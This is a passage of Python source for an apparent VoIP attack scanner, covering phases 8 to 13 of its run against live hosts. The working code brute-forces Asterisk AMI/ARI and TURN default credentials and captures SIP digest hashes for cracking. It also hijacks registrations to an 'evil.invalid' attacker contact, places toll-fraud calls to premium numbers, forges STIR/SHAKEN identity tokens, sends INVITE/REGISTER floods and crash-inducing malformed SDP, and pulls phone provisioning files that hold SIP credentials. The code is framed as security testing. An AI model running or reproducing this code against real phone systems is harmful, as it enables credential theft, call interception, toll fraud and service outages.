    if not resp or resp[:2] != b"\x01\x13":
        return  # No TURN server

    decoded = resp.decode(errors="replace")
    realm_m = re.search(r'realm[=:]\s*"?([^"\r\n]+)"?', decoded, re.I)
    nonce_m = re.search(r'nonce[=:]\s*"?([^"\r\n]+)"?', decoded, re.I)
    realm = realm_m.group(1) if realm_m else "voip"
    nonce = nonce_m.group(1) if nonce_m else "defaultnonce"

    for user,pwd in [("turn","turn"),("admin","admin"),("asterisk","asterisk"),("test","test")]:
        try:
            pkt = _build_turn_alloc_with_creds(user, pwd, realm, nonce)
            resp2 = await udp_xfer(ip, 3478, pkt, timeout=3)
            if resp2 and resp2[:2] == b"\x01\x03":
                await st.finding(ip,"CREDENTIAL",f"TURN Default Credentials Accepted: {user}:{pwd}",
                    "HIGH",
                    f"TURN server at {ip}:3478 granted allocation with {user}:{pwd}",
                    f"udp://{ip}:3478")
                return
        except Exception:
            pass


async def _ice_harvest(ip,st):
    resp = await sip_probe(ip,5060,sip_msg("INVITE",ip,body=sdp(ip)),timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp):
        candidates = re.findall(r'a=candidate:[^\r\n]+',resp)
        if candidates:
            private_cands = [c for c in candidates
                             if re.search(r'192\.168\.|10\.|172\.1[6-9]\.',c)]
            if private_cands:
                await st.finding(ip,"INFO-DISCLOSURE",
                    "ICE Candidates Expose Private Network Topology","MEDIUM",
                    f"Private IPs in ICE: {private_cands[:3]}",f"sip://{ip}:5060")

# ══════════════════════════════════════════════════════════
# PHASE 8 — IAX2 Protocol Testing
# ══════════════════════════════════════════════════════════
async def phase8_iax2(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 8 │ IAX2 (Inter-Asterisk eXchange) PROTOCOL TESTING")
    targets = state.iax2_hosts or state.live_ips
    if not targets:
        Con.warn("No IAX2 targets — skipping"); return

    async def iax_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_iax2_poke(ip,state),        "iax_poke"),
            safe(_iax2_regreq(ip,state),      "iax_reg"),
            safe(_iax2_enum(ip,state),        "iax_enum"),
            safe(_iax2_trunk_test(ip,state),  "iax_trunk"),
        )

    await asyncio.gather(*[_sem_probe(sem, iax_all, ip) for ip in targets])
    Con.ok("Phase 8 complete — IAX2 testing done")


async def _iax2_poke(ip,st):
    poke = b"\x80\x00\x00\x00\x00\x01\x00\x00\x1e"
    resp = await udp_xfer(ip,IAX2_PORT,poke,timeout=3)
    if resp and len(resp)>=4:
        await st.finding(ip,"EXPOSURE","IAX2 Service Open (Port 4569)","MEDIUM",
            "IAX2 stack responding — version enumeration and trunk attacks possible",
            f"udp://{ip}:{IAX2_PORT}")
        if ip not in st.iax2_hosts:
            st.iax2_hosts.append(ip)


async def _iax2_regreq(ip,st):
    try:
        frame = bytearray(b"\x80\x01\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00")
        frame += b"\x06\x09anonymous"
        resp = await udp_xfer(ip,IAX2_PORT,bytes(frame),timeout=3)
        if resp:
            # Parse response type
            if len(resp) >= 12:
                resp_type = resp[8] if len(resp) > 8 else 0
                if b"REGAUTH" in resp or resp_type == 0x04:
                    await st.finding(ip,"EXPOSURE","IAX2 REGREQ Challenged — Auth Required","LOW",
                        "IAX2 REGAUTH received — trunk brute-force possible",
                        f"udp://{ip}:{IAX2_PORT}")
                elif b"REGACK" in resp or resp_type == 0x0f:
                    await st.finding(ip,"MISCONFIGURATION","IAX2 Anonymous Registration Accepted",
                        "CRITICAL",
                        "IAX2 REGACK without credentials — trunk takeover possible",
                        f"udp://{ip}:{IAX2_PORT}")
    except Exception:
        pass


async def _iax2_enum(ip,st):
    for ext in ["100","200","1000","admin","operator"]:
        try:
            frame = b"\x80\x01\x00\x00\x00\x00\x00\x00\x06\x1c\x00\x00"
            frame += b"\x17" + bytes([len(ext)]) + ext.encode()
            resp  = await udp_xfer(ip,IAX2_PORT,frame,timeout=2)
            if resp and len(resp)>4:
                await st.finding(ip,"INFO-DISCLOSURE",
                    f"IAX2 Extension {ext} Enumerable via DPREQ","LOW",
                    "DPREQ exposes dialplan structure",f"udp://{ip}:{IAX2_PORT}")
                break
        except: pass


async def _iax2_trunk_test(ip,st):
    try:
        new_frame = (b"\x80\x01\x00\x00\x00\x00\x00\x00"
                     b"\x06\x01\x00\x00"
                     b"\x03\x04\x00\x00\x00\x01"
                     b"\x04\x04\x00\x00\x00\x04"
                     b"\x0a\x07+1900123"
                     b"\x08\x03100")
        resp = await udp_xfer(ip,IAX2_PORT,new_frame,timeout=3)
        if resp and len(resp)>=4:
            resp_type = resp[8] if len(resp) > 8 else 0
            # Not REJECT (0x05) and not HANGUP = call was accepted
            if resp_type not in (0x05, 0x04, 0x29):
                await st.finding(ip,"MISCONFIGURATION","IAX2 Outbound Call Without Auth","CRITICAL",
                    "IAX2 NEW accepted without HMAC-MD5 — toll fraud via IAX2 trunk",
                    f"udp://{ip}:{IAX2_PORT}")
    except: pass

# ══════════════════════════════════════════════════════════
# PHASE 9 — MGCP / SCCP / H.323 Testing
# ══════════════════════════════════════════════════════════
async def phase9_mgcp_sccp_h323(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 9 │ MGCP · SCCP/Skinny · H.323 PROTOCOL TESTING")
    targets = state.live_ips
    if not targets:
        Con.warn("No live hosts — skipping legacy protocol tests"); return

    async def legacy_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_mgcp_probe(ip,state),    "mgcp"),
            safe(_mgcp_eplist(ip,state),   "mgcp_ep"),
            safe(_sccp_probe(ip,state),    "sccp"),
            safe(_sccp_enum(ip,state),     "sccp_enum"),
            safe(_h323_probe(ip,state),    "h323"),
            safe(_h323_enum(ip,state),     "h323_enum"),
        )

    await asyncio.gather(*[_sem_probe(sem, legacy_all, ip) for ip in targets])
    Con.ok("Phase 9 complete — MGCP/SCCP/H.323 testing done")


async def _mgcp_probe(ip,st):
    pkt  = f"AUEP 100 aaln/1@{ip} MGCP 1.0\r\n\r\n".encode()
    resp = await udp_xfer(ip,MGCP_PORT,pkt,timeout=3)
    if resp and len(resp)>=3:
        code = resp[:3]
        await st.finding(ip,"EXPOSURE","MGCP (Port 2427) Open","MEDIUM",
            f"MGCP gateway responding (code {code.decode(errors='replace')}) — endpoint enumeration possible",
            f"udp://{ip}:{MGCP_PORT}")
        if ip not in st.mgcp_hosts:
            st.mgcp_hosts.append(ip)


async def _mgcp_eplist(ip,st):
    for ep in ["aaln/1","aaln/*","S0/SU0@[email protected]"]:
        pkt  = f"RQNT 101 {ep}@{ip} MGCP 1.0\r\nX: dummy\r\n\r\n".encode()
        resp = await udp_xfer(ip,MGCP_PORT,pkt,timeout=3)
        if resp and len(resp)>=3:
            code = resp[:3]
            if code in (b"200",b"250"):
                await st.finding(ip,"MISCONFIGURATION",
                    f"MGCP RQNT Accepted for {ep}","HIGH",
                    "Unauth MGCP command accepted — gateway may be fully controllable",
                    f"udp://{ip}:{MGCP_PORT}")
                return


async def _sccp_probe(ip,st):
    if not await tcp_open(ip,SCCP_PORT,timeout=3): return
    keepalive = struct.pack("<IIH",4,0,0x0000)
    resp = await tcp_xfer(ip,SCCP_PORT,keepalive,timeout=4)
    if resp and len(resp)>=8:
        await st.finding(ip,"EXPOSURE","SCCP/Skinny (Port 2000) Open","MEDIUM",
            "Cisco Skinny protocol stack responding — phone enumeration possible",
            f"tcp://{ip}:{SCCP_PORT}")
        if ip not in st.sccp_hosts:
            st.sccp_hosts.append(ip)


async def _sccp_enum(ip,st):
    if ip not in st.sccp_hosts: return
    dev_name = b"SEP001122334455" + b"\x00"*16
    reg_msg  = struct.pack("<I",0x0001) + dev_name + \
               struct.pack("<IIIH4sH",1,1,1,7, socket.inet_aton("1.2.3.4"),6)
    hdr      = struct.pack("<II",len(reg_msg),0)
    resp     = await tcp_xfer(ip,SCCP_PORT,hdr+reg_msg,timeout=5)
    if resp and len(resp)>4:
        msg_type = struct.unpack_from("<I",resp,4)[0] if len(resp)>=8 else 0
        if msg_type==0x009d:
            await st.finding(ip,"MISCONFIGURATION",
                "SCCP Unauthenticated Station Registration Accepted","CRITICAL",
                "Cisco Skinny accepted StationRegister without auth — phone impersonation",
                f"tcp://{ip}:{SCCP_PORT}")
        elif msg_type==0x0009:
            await st.finding(ip,"EXPOSURE","SCCP Registration Initiated — CapabilitiesReq","MEDIUM",
                "SCCP server sent CapabilitiesReq — further exploitation possible",
                f"tcp://{ip}:{SCCP_PORT}")


async def _h323_probe(ip,st):
    if not await tcp_open(ip,H323_PORT,timeout=3): return
    q931 = bytes([
        0x08,0x02,0x00,0x05,
        0x05,0xa1,
        0x04,0x03,0x80,0x90,0xa3,
    ])
    resp = await tcp_xfer(ip,H323_PORT,q931,timeout=5)
    if resp and len(resp)>=4:
        await st.finding(ip,"EXPOSURE","H.323 (Port 1720) Open","MEDIUM",
            "H.323 Q.931 stack responding — legacy VoIP exploitation possible",
            f"tcp://{ip}:{H323_PORT}")
        if ip not in st.h323_hosts:
            st.h323_hosts.append(ip)


async def _h323_enum(ip,st):
    if ip not in st.h323_hosts: return
    gk_req = bytes([0x00,0x09,0x00,0x00,0x00,0x00,0x01,0x00])
    resp = await udp_xfer(ip,1719,gk_req,timeout=3)
    if resp and len(resp)>=4:
        await st.finding(ip,"EXPOSURE","H.323 Gatekeeper RAS Responding","MEDIUM",
            "H.323 RAS on UDP 1719 responding — gatekeeper enumeration possible",
            f"udp://{ip}:1719")

# ══════════════════════════════════════════════════════════
# PHASE 10 — TFTP Phone Provisioning
# ══════════════════════════════════════════════════════════
async def phase10_tftp(state:State, sess, sem:asyncio.Semaphore):
    Con.phase("PHASE 10 │ TFTP · PHONE PROVISIONING · AUTO-CONFIG HIJACKING")
    if not state.live_ips:
        Con.warn("No live hosts — skipping TFTP phase"); return

    async def tftp_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_tftp_probe(ip,state),              "tftp_probe"),
            safe(_provision_paths(ip,state,sess),    "provision"),
            safe(_http_provision(ip,state,sess),     "http_prov"),
            safe(_dhcp_option_info(ip,state),        "dhcp_opt"),
        )

    await asyncio.gather(*[_sem_probe(sem, tftp_all, ip) for ip in state.live_ips])
    Con.ok(f"Phase 10 complete — {len(state.provision_urls)} provisioning issues found")


def _tftp_rrq(filename:str) -> bytes:
    return b"\x00\x01" + filename.encode() + b"\x00" + b"octet" + b"\x00"


async def _tftp_probe(ip,st):
    for fname in [FAKE_MAC+".cfg",FAKE_MAC+".xml","000000000000.cfg",
                  "phone.cfg","sip.cfg","spa000000000000.cfg"]:
        pkt  = _tftp_rrq(fname)
        resp = await udp_xfer(ip,TFTP_PORT,pkt,timeout=3)
        if resp and len(resp)>=4 and resp[:2]==b"\x00\x03":
            await st.finding(ip,"EXPOSURE",
                f"TFTP Server Returned Phone Config ({fname})","CRITICAL",
                "TFTP config file readable without auth — contains SIP credentials, server IPs",
                f"tftp://{ip}/{fname}")
            st.provision_urls.append({"ip":ip,"path":f"tftp/{fname}","status":"accessible"})
            return
        elif resp and resp[:2]==b"\x00\x05":
            await st.finding(ip,"EXPOSURE","TFTP Server Open — Config Files Potentially Available",
                "LOW",
                f"TFTP port {TFTP_PORT} open — test with actual device MAC for config theft",
                f"tftp://{ip}/")
            return


async def _provision_paths(ip,st,sess):
    macs = [FAKE_MAC,"001565000001","0004f2000001","00026b000001"]

    async def _probe(mac, path_tpl, proto, port):
        path = path_tpl.replace("{mac}", mac).replace("{MAC}", mac.upper())
        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
        if c == 200 and (_SIP_CRED_RE.search(b) or len(b) > 200):
            return path, proto, port, c
        return None

    protos_ports = [("http",80),("http",8080),("https",443)]
    tasks = [
        _probe(mac, path_tpl, proto, port)
        for mac in macs
        for path_tpl in PHONE_PROVISION_PATHS
        for proto, port in protos_ports
    ]
    for fut in asyncio.as_completed(tasks):
        result = await fut
        if result:
            path, proto, port, c = result
            await st.finding(ip,"EXPOSURE",
                f"Phone Provisioning Config Exposed: {path}","CRITICAL",
                "Provisioning file readable — may contain SIP credentials",
                f"{proto}://{ip}:{port}{path}")
            st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
            return


async def _http_provision(ip,st,sess):
    paths_protos = [
        (path, proto, port)
        for path in ["/AutoProvision/","/provision/","/provision.php",
                     "/cgi-bin/provision.cgi","/phones/config/"]
        for proto, port in [("http",80),("http",8080)]
    ]

    async def _probe(path, proto, port):
        c, b = await http_get(sess, f"{proto}://{ip}:{port}{path}", timeout=3)
        if c == 200 and len(b) > 100:
            return path, proto, port, c
        return None

    results = await asyncio.gather(*[_probe(*pp) for pp in paths_protos],
                                   return_exceptions=True)
    for result in results:
        if result and not isinstance(result, Exception):
            path, proto, port, c = result
            await st.finding(ip,"EXPOSURE",
                f"Auto-Provision Endpoint Open: {path}","HIGH",
                "Provisioning API accessible without auth",
                f"{proto}://{ip}:{port}{path}")
            st.provision_urls.append({"ip":ip,"path":path,"status":f"HTTP {c}"})
            return


async def _dhcp_option_info(ip,st):
    try:
        resp = await tcp_xfer(ip,80,
            b"OPTIONS / HTTP/1.0\r\nHost: "+ip.encode()+b"\r\n\r\n",timeout=4)
        if resp:
            decoded = resp.decode(errors="replace")
            if re.search(r'X-Provision|X-Config|tftp|auto-provision',decoded,re.I):
                await st.finding(ip,"INFO-DISCLOSURE",
                    "Provisioning Server Info in HTTP Headers","MEDIUM",
                    "HTTP headers reveal TFTP/provisioning infrastructure",
                    f"http://{ip}/")
    except: pass

# ══════════════════════════════════════════════════════════
# PHASE 11 — Auth, AMI, ARI & Credential Harvesting
# ══════════════════════════════════════════════════════════
async def phase11_auth(state:State, sess, sem:asyncio.Semaphore):
    Con.phase("PHASE 11 │ AUTH BYPASS · AMI · ARI · CREDENTIAL HARVESTING")
    if not state.live_ips:
        Con.warn("No live hosts — skipping auth phase"); return

    async def auth_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_digest_bypass(ip,state),     "digest_bp"),
            safe(_digest_capture(ip,state),    "digest_cap"),
            safe(_reg_hijack(ip,state),        "reg_hijack"),
            safe(_unauth_refer(ip,state),      "refer"),
            safe(_md5_weak(ip,state),          "md5"),
            safe(_trunk_auth_bypass(ip,state), "trunk"),
            safe(_ami_brute(ip,state),         "ami"),
            safe(_ari_brute(ip,state,sess),    "ari"),
            safe(_ami_http(ip,state,sess),     "ami_http"),
            safe(_stir_shaken(ip,state),       "stir"),
        )

    await asyncio.gather(*[_sem_probe(sem, auth_all, ip) for ip in state.live_ips])
    Con.ok(f"Phase 11 complete — {len(state.digest_hashes)} hashes captured")


async def _digest_bypass(ip,st):
    for label,nonce,rsp in [("EmptyResponse","test",""),("EmptyNonce","",""),
                             ("ZeroResponse","test","0"*32)]:
        auth = (f'Authorization: Digest username="admin",realm="{ip}",'
                f'nonce="{nonce}",uri="sip:{ip}",response="{rsp}"\r\n')
        extra = (f"To: <sip:admin@{ip}>\r\nFrom: <sip:admin@{ip}>;tag={_sid()[:8]}\r\n"
                 f"{auth}Expires: 60\r\n")
        pkt  = sip_msg("REGISTER",ip,extra_hdrs=extra)
        resp = await sip_probe(ip,5060,pkt,timeout=5)
        if resp and re.search(r"SIP/2\.0 200 OK",resp):
            await st.finding(ip,"AUTH-BYPASS",f"SIP Digest Bypass: {label}","CRITICAL",
                f"Server accepted REGISTER with {label} — authentication completely bypassed",
                f"sip://{ip}:5060")


async def _digest_capture(ip,st):
    pkt  = sip_msg("REGISTER",ip,from_user="cracker",extra_hdrs="Expires: 60\r\n")
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if not resp: return
    if "401" in resp or "407" in resp:
        for line in resp.splitlines():
            if re.match(r"^(WWW-Authenticate|Proxy-Authenticate):",line,re.I):
                st.digest_hashes.append({"ip":ip,"user":"cracker",
                    "hash_line":line.strip(),
                    "ts":datetime.now(timezone.utc).isoformat()})
                Con.info(f"Digest challenge captured @ {ip} — "
                         f"{col('hashcat -m 11400','cyan')} digest_hashes.txt")
                break


async def _reg_hijack(ip,st):
    extra = (f"To: <sip:100@{ip}>\r\nFrom: <sip:100@{ip}>;tag={_sid()[:8]}\r\n"
             f"Contact: <sip:attacker@evil.invalid>\r\nExpires: 3600\r\n")
    pkt  = sip_msg("REGISTER",ip,extra_hdrs=extra)
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp):
        await st.finding(ip,"AUTH-BYPASS","Registration Hijacking — Call Redirect","CRITICAL",
            "Unauth re-REGISTER accepted — all calls to ext 100 forwarded to attacker",
            f"sip://{ip}:5060")


async def _unauth_refer(ip,st):
    extra = (f"To: <sip:100@{ip}>\r\nFrom: <sip:scanner@scanner>;tag={_sid()[:8]}\r\n"
             f"Refer-To: <sip:+19001234567@pstn.invalid>\r\n")
    pkt  = sip_msg("REFER",ip,extra_hdrs=extra)
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 (200|202)",resp):
        await st.finding(ip,"AUTH-BYPASS","Unauthenticated REFER — Toll Fraud","CRITICAL",
            "REFER to premium number accepted — initiates outbound call at victim's expense",
            f"sip://{ip}:5060")


async def _md5_weak(ip,st):
    pkt  = sip_msg("REGISTER",ip,extra_hdrs=f"To: <sip:probe@{ip}>\r\n")
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r'algorithm=MD5([^-]|$)',resp,re.I) \
            and not re.search(r'qop=',resp,re.I):
        await st.finding(ip,"WEAK-CRYPTO","SIP MD5 Digest Without qop","MEDIUM",
            "MD5+no-qop → replay attack possible (RFC 7616: use SHA-256+qop=auth-int)",
            f"sip://{ip}:5060")


async def _trunk_auth_bypass(ip,st):
    extra = (f"To: <sip:+19001234567@{ip}>\r\n"
             f"From: <sip:anonymous@anonymous.invalid>;tag={_sid()[:8]}\r\n"
             f"Privacy: id\r\n")
    pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # 100/180/183/200 means server is routing the call without auth
    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
        await st.finding(ip,"MISCONFIGURATION","SIP Trunk Auth Bypass — Toll Fraud","CRITICAL",
            "INVITE to +1-900 number accepted without auth — toll fraud via anonymous trunk",
            f"sip://{ip}:5060")


async def _ami_brute(ip,st):
    """Async AMI brute-force — parallel attempts with first-success early exit."""
    if not await tcp_open(ip, AMI_PORT, timeout=3.0):
        return

    async def _try_ami(user: str, pwd: str) -> Optional[tuple]:
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, AMI_PORT), timeout=4.0)
            banner = await asyncio.wait_for(r.read(256), timeout=2.0)
            if b"Asterisk" not in banner and b"Call Manager" not in banner:
                w.close()
                return None
            login = f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n"
            w.write(login.encode())
            await w.drain()
            resp = await asyncio.wait_for(r.read(1024), timeout=2.0)
            try:
                w.close()
                await asyncio.wait_for(w.wait_closed(), timeout=0.5)
            except Exception:
                pass
            return (user, pwd) if b"Response: Success" in resp else None
        except Exception:
            return None

    # Run all credential attempts in parallel, grab first success
    results = await asyncio.gather(*[_try_ami(u, p) for u, p in AMI_CREDS],
                                   return_exceptions=True)
    for result in results:
        if result and not isinstance(result, Exception):
            user, pwd = result
            await st.finding(ip,"CREDENTIAL",f"Asterisk AMI Login: {user}:{pwd}","CRITICAL",
                "Full PBX control — run commands, intercept calls, read CDR",
                f"tcp://{ip}:{AMI_PORT}")
            return


async def _ari_brute(ip,st,sess):
    combos = [(u, p, proto, port)
              for u, p in ARI_CREDS
              for proto, port in [("http",8088),("https",8089)]]

    async def _probe(user, pwd, proto, port):
        c, b = await http_get(sess, f"{proto}://{ip}:{port}/ari/applications",
                              auth=(user, pwd), timeout=4)
        if c==200 and re.search(r'(\[|\{|application)',b,re.I):
            return user, pwd, proto, port
        return None

    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
        result = await fut
        if result:
            user, pwd, proto, port = result
            await st.finding(ip,"CREDENTIAL",f"Asterisk ARI Login: {user}:{pwd}","CRITICAL",
                "ARI full access — real-time call control, eavesdropping, CDR access",
                f"{proto}://{ip}:{port}/ari/")
            return


async def _ami_http(ip,st,sess):
    combos = [(proto, port, u, p)
              for proto, port in [("http",8088),("https",8089)]
              for u, p in AMI_CREDS[:4]]

    async def _probe(proto, port, user, pwd):
        c, b = await http_get(sess,
            f"{proto}://{ip}:{port}/rawman?action=Login&username={user}&secret={pwd}",
            timeout=4)
        if c==200 and "Response: Success" in b:
            return user, pwd, proto, port
        return None

    for fut in asyncio.as_completed([_probe(*c) for c in combos]):
        result = await fut
        if result:
            user, pwd, proto, port = result
            await st.finding(ip,"CREDENTIAL",f"AMI HTTP Login: {user}:{pwd}","CRITICAL",
                "AMI-over-HTTP accepted",f"{proto}://{ip}:{port}/rawman")
            return


async def _stir_shaken(ip,st):
    fake_identity = (
        "eyJhbGciOiJFUzI1NiIsInBwdCI6InNoYWtlbiIsInR5cCI6InBhc3Nwb3J0IiwieDV1IjoiaHR0cDovL2Zha2UuaW52YWxpZC9jZXJ0LnBlbSJ9"
        ".eyJhdHRlc3QiOiJBIiwiZGVzdCI6eyJ0biI6WyIrMTIzNDU2Nzg5MCJdfSwiaWF0IjoxNjAwMDAwMDAwLCJvcmlnIjp7InRuIjoiKzE5ODc2NTQzMjEifSwib3JpZ2lkIjoiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwIn0"
        ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    )
    extra = (f"Identity: {fake_identity};info=<http://fake.invalid/cert.pem>;alg=ES256;ppt=shaken\r\n"
             f"To: <sip:+12345678901@{ip}>\r\nFrom: <sip:+19876543210@{ip}>;tag={_sid()[:8]}\r\n")
    pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # Only flag on 180/200 — the STIR token is invalid so 403 would be correct
    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
        await st.finding(ip,"CVE-2022-26499","STIR/SHAKEN Verification Bypass — Call Accepted","HIGH",
            "Server accepted INVITE with invalid/unsigned Identity header — caller-ID spoofing",
            f"sip://{ip}:5060")

# ══════════════════════════════════════════════════════════
# PHASE 12 — DoS & Flooding Attacks
# ══════════════════════════════════════════════════════════
async def phase12_dos(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 12 │ DoS · FLOODING · RESOURCE EXHAUSTION TESTING")
    if not state.live_ips:
        Con.warn("No live hosts — skipping DoS phase"); return

    async def dos_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_invite_flood(ip,state),       "invite_flood"),
            safe(_register_flood(ip,state),     "reg_flood"),
            safe(_bye_inject(ip,state),         "bye_inject"),
            safe(_cancel_storm(ip,state),       "cancel"),
            safe(_options_flood(ip,state),      "opts_flood"),
            safe(_malformed_sdp(ip,state),      "bad_sdp"),
            safe(_subscribe_bomb(ip,state),     "sub_bomb"),
            safe(_publish_flood(ip,state),      "pub_flood"),
            safe(_re_invite_loop(ip,state),     "reinvite"),
        )

    await asyncio.gather(*[_sem_probe(sem, dos_all, ip) for ip in state.live_ips])
    Con.ok("Phase 12 complete — DoS testing done")


async def _invite_flood(ip,st):
    pkts  = [sip_msg("INVITE",ip,body=sdp(ip),cseq=i) for i in range(1,11)]
    t0    = time.monotonic()
    resps = await asyncio.gather(*[udp_xfer(ip,5060,p,timeout=2) for p in pkts])
    dt    = time.monotonic()-t0
    answered = sum(1 for r in resps if r)
    if answered>=7:
        await st.finding(ip,"EXPOSURE","INVITE Flood — No Rate Limiting Detected","MEDIUM",
            f"{answered}/10 rapid INVITEs answered in {dt:.1f}s — flood protection absent",
            f"sip://{ip}:5060")


async def _register_flood(ip,st):
    async def flood_reg(i):
        u = f"flood{i:04d}"
        extra = (f"To: <sip:{u}@{ip}>\r\nFrom: <sip:{u}@{ip}>;tag={_sid()[:8]}\r\n"
                 f"Expires: 60\r\n")
        return await udp_xfer(ip,5060,sip_msg("REGISTER",ip,from_user=u,extra_hdrs=extra),timeout=2)
    resps = await asyncio.gather(*[flood_reg(i) for i in range(15)])
    answered = sum(1 for r in resps if r and b"SIP/2.0" in r)
    if answered>=12:
        await st.finding(ip,"EXPOSURE","REGISTER Flood — No Rate Limiting","MEDIUM",
            f"{answered}/15 flood REGISTERs answered",f"sip://{ip}:5060")


async def _bye_inject(ip,st):
    """BYE injection: a proper server should return 481 (no such transaction), not 200."""
    extra = (f"To: <sip:victim@{ip}>;tag={_sid()[:8]}\r\n"
             f"From: <sip:attacker@scanner>;tag={_sid()[:8]}\r\n")
    resp = await sip_probe(ip,5060,sip_msg("BYE",ip,extra_hdrs=extra),timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp):
        await st.finding(ip,"MISCONFIGURATION","BYE Injection Accepted (200 OK) — Out-of-Dialog","CRITICAL",
            "Out-of-dialog BYE returned 200 — active calls terminatable by attacker",
            f"sip://{ip}:5060")


async def _cancel_storm(ip,st):
    pkts  = [sip_msg("CANCEL",ip,cseq=i) for i in range(8)]
    resps = await asyncio.gather(*[udp_xfer(ip,5060,p,timeout=2) for p in pkts])
    errors = sum(1 for r in resps if r and b"500" in r)
    if errors>=4:
        await st.finding(ip,"EXPOSURE","CANCEL Storm → 500 Errors","MEDIUM",
            f"{errors}/8 CANCEL messages caused 500 — server unstable under CANCEL flood",
            f"sip://{ip}:5060")


async def _options_flood(ip,st):
    pkts  = [sip_msg("OPTIONS",ip,cseq=i) for i in range(20)]
    resps = await asyncio.gather(*[udp_xfer(ip,5060,p,timeout=1) for p in pkts])
    answered = sum(1 for r in resps if r)
    if answered>=18:
        await st.finding(ip,"EXPOSURE","OPTIONS Flood Not Rate-Limited","LOW",
            f"{answered}/20 OPTIONS answered without rate limit",f"sip://{ip}:5060")


async def _malformed_sdp(ip,st):
    for bad_sdp_body in ["v=INVALID\r\nm=audio BADPORT INVALID 0\r\n",
                    "v=0\r\n"+"x"*65536+"\r\n"]:
        pkt  = sip_msg("INVITE",ip,body=bad_sdp_body)
        resp1 = await sip_probe(ip,5060,pkt,timeout=5)
        # Verify server is still up
        resp2 = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=3)
        if resp1 and "500" in resp1:
            await st.finding(ip,"FUZZING","Malformed SDP → 500 Error","HIGH",
                "Server returned 500 on invalid SDP — possible parser vulnerability",
                f"sip://{ip}:5060")
            return
        elif resp1 and not resp2:
            await st.finding(ip,"FUZZING","Malformed SDP → Server Crash","CRITICAL",
                "Server stopped responding after malformed SDP — crash induced",
                f"sip://{ip}:5060")
            return


async def _subscribe_bomb(ip,st):
    events = ["presence","dialog","message-summary","reg","call-info",
              "ua-profile","voicemail","conference","spirits-INDPs","check-sync"]

    async def _probe(ev):
        extra = f"Event: {ev}\r\nExpires: 3600\r\n"
        resp  = await sip_probe(ip,5060,sip_msg("SUBSCRIBE",ip,extra_hdrs=extra),timeout=3)
        return bool(resp and re.search(r"SIP/2\.0 200 OK",resp))

    results = await asyncio.gather(*[_probe(ev) for ev in events], return_exceptions=True)
    answered = sum(1 for r in results if r is True)
    if answered>=5:
        await st.finding(ip,"EXPOSURE","SUBSCRIBE Bomb — Multiple Event Packages Accepted","MEDIUM",
            f"{answered}/10 SUBSCRIBE event types accepted without auth — resource exhaustion",
            f"sip://{ip}:5060")


async def _publish_flood(ip,st):
    body  = '<?xml version="1.0"?><presence xmlns="urn:ietf:params:xml:ns:pidf"><tuple id="x"><status><basic>open</basic></status></tuple></presence>'
    extra = "Event: presence\r\nExpires: 3600\r\nContent-Type: application/pidf+xml\r\n"
    pkts  = [sip_msg("PUBLISH",ip,from_user=f"flood{i}",extra_hdrs=extra,body=body)
             for i in range(8)]
    resps = await asyncio.gather(*[udp_xfer(ip,5060,p,timeout=2) for p in pkts])
    ok    = sum(1 for r in resps if r and b"200" in r)
    if ok>=6:
        await st.finding(ip,"EXPOSURE","PUBLISH Flood Accepted","LOW",
            f"{ok}/8 PUBLISH messages accepted — presence DB DoS possible",
            f"sip://{ip}:5060")


async def _re_invite_loop(ip,st):
    call_id = f"loop{_sid()}@scanner"
    pkts = []
    for i in range(5):
        raw = (f"INVITE sip:{ip} SIP/2.0\r\n"
               f"Via: SIP/2.0/UDP scanner:5060;branch=z9hG4bK-loop{i}\r\n"
               f"To: <sip:{ip}>\r\nFrom: <sip:looper@scanner>;tag=loop{i}\r\n"
               f"Call-ID: {call_id}\r\nCSeq: {i+1} INVITE\r\n"
               f"Content-Length: 0\r\n\r\n").encode()
        pkts.append(raw)
    resps = await asyncio.gather(*[udp_xfer(ip,5060,p,timeout=2) for p in pkts])
    errors = sum(1 for r in resps if r and b"500" in r)
    if errors>=3:
        await st.finding(ip,"EXPOSURE","Re-INVITE Loop Causes 500 Errors","MEDIUM",
            "Rapid re-INVITE on same Call-ID destabilises server",f"sip://{ip}:5060")

# ══════════════════════════════════════════════════════════
# PHASE 13 — SNMP / Management Interface Testing
# ══════════════════════════════════════════════════════════
async def phase13_snmp_mgmt(state:State, sess, sem:asyncio.Semaphore):
    Con.phase("PHASE 13 │ SNMP BRUTE · MANAGEMENT API · PATH TRAVERSAL")
    if not state.live_ips:
        Con.warn("No live hosts — skipping management phase"); return

    async def mgmt_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_snmp_brute(ip,state),        "snmp"),
